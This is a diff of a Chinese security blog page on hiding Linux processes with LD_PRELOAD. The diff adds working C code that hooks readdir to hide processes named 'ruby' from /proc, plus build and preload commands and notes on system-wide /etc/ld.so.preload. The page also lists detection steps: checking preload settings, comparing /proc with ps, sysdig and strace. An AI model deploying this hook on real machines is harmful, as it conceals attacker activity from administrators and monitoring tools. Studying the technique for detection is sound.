@@ -1843,7 +1843,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2021-07-26 17:41:58">2021-07-26 17:20</time>
+        创建时间:<time class="date" title="更新时间: 2021-07-26 18:12:22">2021-07-26 17:20</time>
         
     </div>
     <div class="article-meta">
@@ -1865,7 +1865,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD介绍"><span class="toc-text">LD_PRELOAD介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验过程"><span class="toc-text">实验过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD介绍"><span class="toc-text">LD_PRELOAD介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验过程"><span class="toc-text">实验过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#etc-ld-so-preload测试的问题"><span class="toc-text">/etc/ld.so.preload测试的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1978,14 +1978,110 @@ struct dirent *readdir(DIR *dirp){
         }
 }
 </code></pre>
+<p>while循环continue屏蔽</p>
+<pre><code class="C">#define _GNU_SOURCE
+#include &lt;dirent.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;unistd.h&gt;
+
+
+static int get_dir_name(DIR* dirp, char* buf, size_t size)
+{
+    int fd = dirfd(dirp);
+    if(fd == -1) {
+        return 0;
+    }
+
+
+    char tmp[64];
+    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);
+    ssize_t ret = readlink(tmp, buf, size);
+    if(ret == -1) {
+        return 0;
+    }
+
+
+    buf[ret] = 0;
+    return 1;
+}
+
+
+static int get_process_name(char* pid, char* buf)
+{
+    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) {
+        return 0;
+    }
+
+
+    char tmp[256];
+    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);
+
+
+    FILE* f = fopen(tmp, &quot;r&quot;);
+    if(f == NULL) {
+        return 0;
+    }
+
+
+    if(fgets(tmp, sizeof(tmp), f) == NULL) {
+        fclose(f);
+        return 0;
+    }
+
+
+    fclose(f);
+
+
+    int unused;
+    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);
+    return 1;
+}
+
+
+
+
+#define DECLARE_READDIR(dirent, readdir)
+static struct dirent* (*original_readdir)(DIR*) = NULL;
+
+
+static const char* process_to_filter = &quot;ruby&quot;;
+struct dirent *readdir(DIR *dirp){
+        if(original_readdir == NULL) {
+                original_readdir = dlsym(RTLD_NEXT, &quot;readdir&quot;);
+                if(original_readdir==NULL){
+                        printf(&quot;readdir Address Get Failure,Error Code:%d\n&quot;,dlerror());
+                }
+        }
+        struct dirent* dp;
+        while(1){
+                dp=original_readdir(dirp);
+                char dirname[256];
+                char processname[256];
+                get_dir_name(dirp,dirname,sizeof(dirname));
+                if(strcmp(dirname,&quot;/proc&quot;)==0){
+                        get_process_name(dp-&gt;d_name,processname);
+                        if(strcmp(processname,process_to_filter)==0){
+                                continue;
+                        }
+                }
+                break;
+        }
+        return dp;
+}
+</code></pre>
 <p>静态编译:<br><code>gcc -shared -fpic example.c -o example.so</code><br><code>LD_PRELOAD=/home/kali/Desktop/example.so /usr/bin/ps -elf</code> #指定程序使用</p>
 <p>从这些code里面可以明白写LD HOOK的时候，需准备以下操作：</p>
 <pre><code>* 被HOOK的目标函数是否通过libc抽象出来调用的，比如说getuid这种就不是。C原生的，非C原生的都要HOOK C原生函数
 * 实例化被HOOK函数原型
 * 通过dlsym寻找被HOOK原函数的地址，赋予定义的函数原型变量
 * 调用原函数获取内容，判断后是否要return
-</code></pre><p><img src="https://z3.ax1x.com/2021/07/26/Wftm5t.png" alt=""></p>
-<p>使用了/etc/ld.so.preload (最好不要用，由于是全局使用容易出现大规模的问题)<br><img src="https://z3.ax1x.com/2021/07/26/WftBMF.png" alt=""></p>
+</code></pre><p>PS:最好还是用while continue屏蔽</p>
+<p><img src="https://z3.ax1x.com/2021/07/26/Wftm5t.png" alt=""></p>
+<h2 id="etc-ld-so-preload测试的问题"><a href="#etc-ld-so-preload测试的问题" class="headerlink" title="/etc/ld.so.preload测试的问题"></a>/etc/ld.so.preload测试的问题</h2><p>使用了/etc/ld.so.preload (最好不要用，由于是全局使用容易出现大规模的问题) -&gt; 匹配到不是进程名称的就return返回<br><img src="https://z3.ax1x.com/2021/07/26/WftBMF.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/07/26/WfsYOx.png" alt=""></p>
+<p>while循环continue虽然可以避免这个问题，但是执行ps的时候会出现bug<br><img src="https://z3.ax1x.com/2021/07/26/WfswkD.png" alt=""></p>
 <p>防止这种操作蒙蔽双眼：<br>I、检查LD_PRELOAD环境变量是否有异常<br>II、检查ld.so.preload 等配置文件是否有异常<br>III、自己写个python小工具，直接读取/proc中的内容，对于ps等工具的结果，对不上，则存在被劫持可能<br>IV、使用sysdig（有开源版，可以监控ps等的调用过程，观察是否有恶意动态库被加载。strace有类似功能）或者prochunter（google 上search）<br>sysdig proc.name=ps or strace -f ps -elf 2&gt;&amp;1</p>
 <p>遍历/poc目录，获取进程PID。读取/proc/<pid>/stat文件 -&gt; 读取/proc/<pid>/cmdline得到要执行的命令行参数</pid></pid></p>
 <pre><code class="python">import os
@@ -2019,7 +2115,7 @@ getprocess()
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
     <p><span class="copy-title">发布时间:</span>2021-07-26, 17:20:12</p>
-    <p><span class="copy-title">最后更新:</span>2021-07-26, 17:41:58</p>
+    <p><span class="copy-title">最后更新:</span>2021-07-26, 18:12:22</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/906527f2.html" title="Linux 通过LD_PRELOAD实现进程隐藏">http://422926799.github.io/posts/906527f2.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
